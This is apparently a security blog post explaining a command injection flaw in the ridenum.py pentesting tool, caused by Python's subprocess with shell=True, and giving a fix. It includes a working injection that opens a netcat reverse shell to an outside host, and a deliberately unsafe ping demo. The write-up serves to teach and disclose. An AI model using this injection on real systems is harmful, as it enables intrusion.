![Linkedin](Post%20Images/linkedin.png) [Linkedin](https://www.linkedin.com/in/ryangore/) | ![Github](Post%20Images/github.png) [Github](https://github.com/0v3rride)

# Python's Risky Subprocess Module & Pwning A Pentesting Tool
_____________________________________________________________________

For some reason looking at other people's source code makes me get all warm and fuzzy inside. Kinda of like the description a Millenial hipster gives you. You know, when they tell you how they sat down and read a 'good book' with a cup of gluten-free, 100% non-GMO, Rainforest Alliance Certified Coffee. 

Reading source code from other individuals or groups can give you an insight into a lot of things like:
  * New syntax and syntactical methods that you never knew existed in a language
  * How to get code to execute by bypassing AV, countermeasures, etc.
  * What not to do when developing an application of any sort
  * What the drug or alcohol choice of the individual/group was during development ;)
  
## Some Of Python's Dangerous Functions & Methods
Python is a fantastic language. It's one of my favorites along side PowerShell, and C#. However, like all computer languages it doesn't come without it's flaws or dangerous functions and methods. You can read more about some of those dangerous functions and methods in the below links:
 1. https://www.kevinlondon.com/2015/07/26/dangerous-python-functions.html
 2. https://www.kevinlondon.com/2015/08/15/dangerous-python-functions-pt2.html
 3. https://security.openstack.org/guidelines/dg_use-subprocess-securely.html
 4. https://security.openstack.org/guidelines/dg_avoid-shell-true.html
 5. https://medium.com/python-pandemonium/a-trap-of-shell-true-in-the-subprocess-module-6db7fc66cdfd
 6. https://docs.python.org/3.7/library/subprocess.html#popen-objects
 
The links above focus more on which a user is prompted to provide input via the `input` function in Python. Leveraging command injection via command line arguments that will be parsed by a script will be a little trickier, but it's still very simple to do.
 
## The Vulnerability
The vulnerability itself is not super-duper serious as a vast majority of Linux machines will probably not have this tool installed. While working on a CTF problem involving SIDs and looking for another tool to compare with Impacket's lookupsid.py script, I came across a tool written by Dave Kennedy (ReL1K) called RidEnum.py. I was interested in how both tools were obtaining the Domain SID, but that's not really important. However, I noticed in the source code on the [github page](https://github.com/trustedsec/ridenum/blob/master/ridenum.py) that the tool was using a Subprocess.Popen object or two to execute a shell command. This appears on lines 62 and 78. 

There is at least one argument that helped me obtain code execution, which was the argument for the rhost's IP address. It also looks like the `auth` argument is a possibility, but I've had no luck with using it. If you look closely, you'll note that the variable `command` which will store the string representation of the command to be executed takes the `auth` (or optional username argument) and the IP argument and then places them into the string using the "old style" string formatting operator (`%`).

### Two things can be taken in to consideration at this point (links 3, 4 and 5 above do a great job explaining the problems):

1. The `shell` parameter in both calls are set to `true`. That's a no no, especially if you allow a user to supply input to your script or program. In simple terms, this tells Python to execute the string containing the command(s) as if you were doing it in a bash shell.

2. The `command` variable is a **string** variable that contains the entirety of a bash command.

Here's the help documentation for ridenum.
```
Example: ./ridenum.py 192.168.1.50 500 50000 /root/dict.txt /root/user.txt

Usage: ./ridenum.py <server_ip> <start_rid> <end_rid> <optional_username> <optional_password> <optional_password_file> <optional_username_filename>
```
As I said before, doing this via command line arguments is a little tricker. One would expect that all they would have to do is excute the following command `./ridenum.py 10.10.10.10;id; 100 1000 0v3rride`. This doesn't work, because all you're doing is terminating the `ridenum.py` script prematurely without giving it all of the required arguments, calling the bash command `id` and then specifying abunch of crap after the fact that has no meaning in bash (`100 1000 0v3rride`). Take a look at point two again above and notice the keyword 'string'.

Let's execute ridenum and inject the bash command `id`.
```
./ridenum.py "1.1.1.1; nc 192.168.1.126 1234 -c bash;" 0 3 "0v3rride" "mysecretpassword"
```

Result:
```
listening on [any] 1234 ...
connect to [192.168.1.126] from (UNKNOWN) [192.168.1.111] 53370
ls
CHANGELOG.txt
LICENSE.txt
README.md
ridenum.py
```

Note how I placed the `nc` command with the `IP` argument. Why do I need two `;`? If I don't add another `;` to terminate, it looks like `ridenum.py` tries creating a list of users enumerated during RID cycling, which kills the reverse shell immediately. So placing the second `;` after the `nc` command will keep the reverse shell alive until you exit it.

## The Fix
Command/Shell injection via a Python script is really that simple. The fix to this is also pretty simple. Get rid of the `shell=True` or explicitly use `shell=False`. In addition, breaking down the string in referenced by the`command` variable into a list of strings would fix the issue also as this wouldn't treat each subsquent string as an argument to the string in the first indice. 

Change `subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)` to `subprocess.Popen(["rpcclient", "-U", "\"{}\"".format(auth), "{}".format(ip), "-c", "\"lsaquery\""], stdout=subprocess.PIPE)`


## You can play with the following source code below to get a better understanding.

```
import subprocess; 
 
def unsafe_ping(server):
  return subprocess.check_output('ping -c 1 %s' % server, shell=True);

print(unsafe_ping("8.8.8.8; id").decode("UTF-8"));


# def safe_ping(server):
#     return subprocess.check_output(['ping', '-c', '1', server], shell=False);

# print(safe_ping("8.8.8.8; id").decode("UTF-8"));


userinput = input("give some input: ");

print("Test 1: shell=true, string command");
print(subprocess.check_output("echo {}".format(userinput), shell=True).decode("UTF-8"));

#Command injection doesn't seem to work on any of the below

print("Test 3: shell=true, list of strings");
print(subprocess.check_output(["echo", "{}".format(userinput)], shell=True).decode("UTF-8"));

print("Test 2: shell=false, string command");
print(subprocess.check_output("echo {}".format(userinput), shell=False).decode("UTF-8"));

print("Test 4: shell=false, list of strings");
print(subprocess.check_output(["echo", "{}".format(userinput)], shell=False).decode("UTF-8"));
```
